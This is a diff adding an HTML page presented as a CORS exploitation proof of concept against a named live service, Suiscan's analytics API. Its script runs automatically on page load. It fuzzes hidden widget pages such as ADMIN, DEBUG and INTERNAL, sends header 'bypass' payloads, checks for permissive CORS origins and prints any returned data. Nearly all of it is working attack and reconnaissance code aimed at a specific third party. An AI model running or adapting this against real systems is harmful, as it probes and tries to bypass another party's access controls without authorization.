@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Suiscan Analytics CORS PoC</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        pre { background: #111; padding: 10px; border: 1px solid #0f0; margin: 10px 0; }
+        .vulnerable { color: #f00; font-weight: bold; }
+        .success { color: #0f0; }
+        #status { font-size: 18px; }
+    </style>
+</head>
+<body>
+    <h1>Suiscan.xyz Analytics CORS Exploitation PoC</h1>
+    <div id="status">Scanning...</div>
+    <div id="results"></div>
+
+<script>
+// ==================== CONFIG ====================
+const BASE_URL = 'https://analytics.suiscan.xyz/api/light-widgets';
+const ORIGIN = 'https://suiscan.xyz';
+
+// Widget pages untuk fuzzing
+const WIDGET_PAGES = [
+    'ANALYTICS', 'ADMIN', 'USER', 'DEBUG', 'DASHBOARD',
+    'METRICS', 'REPORTS', 'STATS', 'SUMMARY', 'OVERVIEW',
+    'INTERNAL', 'ADMIN_DASHBOARD', 'API', 'DATA',
+];
+
+const PERIODS = ['7D', '30D', '90D', 'ALL', 'YEAR'];
+const SIZES = ['SMALL', 'MEDIUM', 'LARGE', 'FULL'];
+
+// Header bypass payloads
+const HEADERS = [
+    {'x-api-checker':'', 'x-api-random':'', 'x-app-gen':''},
+    {'x-api-checker':'null', 'x-api-random':'null', 'x-app-gen':'null'},
+    {'x-api-checker':'admin', 'x-api-random':'bypass', 'x-app-gen':'poc'}
+];
+
+// ==================== EXPLOIT ====================
+async function testEndpoint(path, headers) {
+    const params = new URLSearchParams({
+        widgetPage: 'ANALYTICS',
+        size: 'SMALL',
+        period: '7D',
+        countEpoch: '0'
+    });
+    
+    const url = `${BASE_URL}${path}?${params}`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'GET',
+            headers: headers,
+            credentials: 'omit'  // Test tanpa cookies
+        });
+        
+        // Check CORS headers
+        const corsHeaders = {
+            origin: response.headers.get('access-control-allow-origin'),
+            credentials: response.headers.get('access-control-allow-credentials'),
+            methods: response.headers.get('access-control-allow-methods')
+        };
+        
+        const result = {
+            url: url,
+            status: response.status,
+            cors: corsHeaders,
+            contentType: response.headers.get('content-type'),
+            contentLength: response.headers.get('content-length'),
+            hasData: response.headers.get('content-length') !== '0'
+        };
+        
+        // Handle response body
+        if (response.ok && result.hasData) {
+            const blob = await response.blob();
+            const text = await blob.text();
+            result.data = text.slice(0, 500);  // First 500 chars
+        }
+        
+        return result;
+        
+    } catch(e) {
+        return { url, error: e.message };
+    }
+}
+
+function displayResult(result) {
+    const resultsDiv = document.getElementById('results');
+    const isVulnerable = result.cors?.origin === '*' || result.cors?.origin?.includes('evil');
+    
+    const html = `
+        <div class="${isVulnerable ? 'vulnerable' : 'success'}">
+            <strong>${result.status || 'ERR'}</strong> 
+            ${result.url}<br>
+            CORS: ${result.cors?.origin || 'None'} 
+            | Len: ${result.contentLength || 0}
+            ${result.hasData ? '<span style="color:#ff0">📊 HAS DATA!</span>' : ''}
+            ${result.data ? `<pre>${result.data}</pre>` : ''}
+        </div>
+    `;
+    resultsDiv.innerHTML += html;
+    document.getElementById('status').textContent = `Tested: ${resultsDiv.children.length}`;
+}
+
+// ==================== AUTO SCAN ====================
+async function runFullScan() {
+    document.getElementById('status').innerHTML = '🚀 Starting comprehensive CORS scan...';
+    
+    // Test 1: Basic endpoint
+    let result = await testEndpoint('/total-accounts', HEADERS[0]);
+    displayResult(result);
+    
+    // Test 2: Widget fuzzing
+    for (let page of WIDGET_PAGES) {
+        let testUrl = `/total-accounts?widgetPage=${page}`;
+        result = await testEndpoint(testUrl, HEADERS[0]);
+        displayResult(result);
+        await new Promise(r => setTimeout(r, 100));  // Rate limit
+    }
+    
+    // Test 3: Header bypass variations
+    for (let headers of HEADERS) {
+        result = await testEndpoint('/total-accounts', headers);
+        displayResult(result);
+    }
+    
+    document.getElementById('status').innerHTML = '✅ Scan complete! Check results above.';
+}
+
+// ==================== EXECUTE ====================
+runFullScan();
+</script>
+</body>
+</html>
